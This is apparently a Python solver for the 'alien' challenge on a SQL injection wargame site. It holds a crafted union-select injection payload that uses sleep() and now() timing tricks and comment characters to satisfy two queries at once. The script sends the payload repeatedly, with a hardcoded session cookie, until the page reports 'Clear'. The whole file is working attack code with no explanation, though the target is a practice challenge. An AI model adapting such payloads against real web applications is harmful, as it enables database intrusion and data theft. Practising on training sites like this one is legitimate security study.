import requests

PAYLOAD = "99999 union select concat(CHAR(0x61+(now()+sleep(1))%2),0x646d696e)#9999999' union select concat(CHAR(0x61+(now()+!sleep(1))%2),0x646d696e);#"

def send(payload):
    return requests.get(
        'https://los.rubiya.kr/chall/alien_91104597bf79b4d893425b65c166d484.php',
        params={'no':payload},
        cookies={'PHPSESSID':'k2re1rtpnv4o5ul7dcu3b5kbn0'}).text

while True:
    resp = send(PAYLOAD)
    if "Clear" in resp:
        print("Clear!")
        print(resp)
        break
    else:
        print(resp)
